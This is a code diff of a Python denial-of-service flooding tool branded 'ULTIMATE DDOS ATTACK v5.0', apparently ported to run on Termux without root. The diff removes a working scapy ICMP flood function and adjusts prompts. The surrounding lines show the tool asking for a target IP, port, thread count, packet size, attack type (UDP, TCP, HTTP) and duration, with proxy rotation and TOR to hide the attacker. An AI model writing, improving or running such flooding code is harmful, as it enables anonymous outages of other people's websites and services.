@@ -6,9 +6,6 @@ import threading
 import requests
 import socks
 import logging
-import base64
-import subprocess
-from scapy.all import IP, TCP, UDP, ICMP, send
 from colorama import init, Fore
 from fake_useragent import UserAgent
 from queue import Queue
@@ -35,7 +32,7 @@ def print_logo():
     print("  / ____|    | |               |  __ \\         | |          | | (_)             ")
     print(" | |    _   _| |__   ___ _ __  | |__) | __ ___ | |_ ___  ___| |_ _  ___  _ __   ")
     print(" | |   | | | | '_ \\ / _ \\ '__| |  ___/ '__/ _ \\| __/ _ \\/ __| __| |/ _ \\| '_ \\  ")
-    print(" | |___| |_| | |_) |  __/ |    | |   | | | (_) | ||  __/ (__| |_| | (_) | | | | ")
+    print(" | |___| |_| | |_) |  __/ |    | |   | | | (_) | ||  __/ (__| |_| | (_)  __/| | | | ")
     print("  \\_____\\__, |_.__/ \\___|_|    |_|   |_|  \\___/ \\__\\___|\\___|\\__|_|\\___/|_| |_| ")
     print("         __/ |                                                                 ")
     print("        |___/                                                                 ")
@@ -45,7 +42,7 @@ def print_logo():
     print("   ╠══════════════════════════════════════════════════════════════════════╣")
     print("   ║  👤 Coded By  : MEHEDI.EXX                                           ║")
     print("   ║  🖊️ Author     : CYBER PROTECTION                                     ║")
-    print("   ║  🔥 Tool Version: 5.0 (Ultimate Edition - Termux Optimized)          ║")
+    print("   ║  🔥 Tool Version: 5.0 (Non-Root Edition - Termux Optimized)          ║")
     print("   ╚══════════════════════════════════════════════════════════════════════╝")
     print("\n")
 
@@ -101,11 +98,11 @@ def get_target_details():
     url = input("\n   ➤ Enter Target Website URL (for HTTP) or press Enter: ")
     ip = input("   ➤ Enter Target IP Address: ")
     port = int(input("   ➤ Enter Target Port Number: "))
-    threads = int(input("   ➤ Enter Number of Threads (1 or more, unlimited): "))
+    threads = int(input("   ➤ Enter Number of Threads (1 or more): "))
     if threads < 1:
         threads = 1
     packet_size = int(input("   ➤ Enter Packet Size (bytes, 64-65500): "))
-    attack_type = input("   ➤ Attack Type (udp/tcp/http/icmp/all): ").lower()
+    attack_type = input("   ➤ Attack Type (udp/tcp/http/all): ").lower()
     duration = int(input("   ➤ Attack Duration (seconds, 0 for unlimited): "))
     print("\n   ✅ Details received successfully.\n")
     return url, ip, port, threads, packet_size, attack_type, duration
@@ -171,24 +168,6 @@ async def http_flood_async(url, thread_name, duration, stats_queue):
                 break
     stats_queue.put(packet_count)
 
-def icmp_flood(ip, thread_name, duration, stats_queue):
-    packet_count = 0
-    start_time = time.time()
-    while duration == 0 or time.time() - start_time < duration:
-        try:
-            packet = IP(dst=ip)/ICMP()
-            send(packet, verbose=0)
-            packet_count += 1
-            msg = f"Thread {thread_name} sent ICMP packet #{packet_count} to {ip}"
-            with print_lock:
-                print(Fore.MAGENTA + f"   ➤ {msg}")
-            logging.info(msg)
-        except Exception as e:
-            with print_lock:
-                print(Fore.RED + f"   ❌ Error in {thread_name}: {e}")
-            break
-    stats_queue.put(packet_count)
-
 def rotate_proxies(proxies, proxy_queue):
     while True:
         random.shuffle(proxies)
@@ -204,7 +183,11 @@ def start_attack(url, ip, port, threads, packet_size, attack_type, duration, use
     print("   ╔══════════════════════════════════════════╗")
     print("   ║         ULTIMATE DDOS ATTACK v5.0        ║")
     print("   ╚══════════════════════════════════════════╝")
-    print(f"\n   🚀 Attack started on {ip}:{port} (Multi-Protocol) or {url} (HTTP) with {threads} threads (Unlimited Mode)")
+    print(f"\n   🚀 Attack started on {ip}:{port} (Multi-Protocol) or {url} (HTTP) with {threads} threads")
+
+    if attack_type == "icmp":
+        print(Fore.RED + "   ❌ ICMP flood not supported without root access. Use udp, tcp, or http instead.")
+        return
 
     proxies = fetch_proxies() if use_proxy else []
     proxy_queue = Queue()
@@ -231,9 +214,6 @@ def start_attack(url, ip, port, threads, packet_size, attack_type, duration, use
                 thread_list.append(t_tcp)
             if attack_type in ["http", "all"] and url:
                 executor.submit(lambda: loop.run_until_complete(run_http_flood(url, thread_name, duration, stats_queue)))
-            if attack_type in ["icmp", "all"]:
-                t_icmp = threading.Thread(target=icmp_flood, args=(ip, thread_name, duration, stats_queue), name=thread_name)
-                thread_list.append(t_icmp)
 
         for t in thread_list:
             t.start()
@@ -252,7 +232,7 @@ def main():
         loading_bar()
         url, ip, port, threads, packet_size, attack_type, duration = get_target_details()
         use_proxy = input("\n   ➤ Use proxies with auto-rotation? (y/n): ").lower() == 'y'
-        use_tor = input("   ➤ Use TOR network? (y/n, requires tor installed): ").lower() == 'y'
+        use_tor = input("   ➤ Use TOR network? (y/n, requires Orbot): ").lower() == 'y'
         start_attack(url, ip, port, threads, packet_size, attack_type, duration, use_proxy, use_tor)
     else:
         print(Fore.RED + "   ❌ Access Denied! Please try logging in again.")
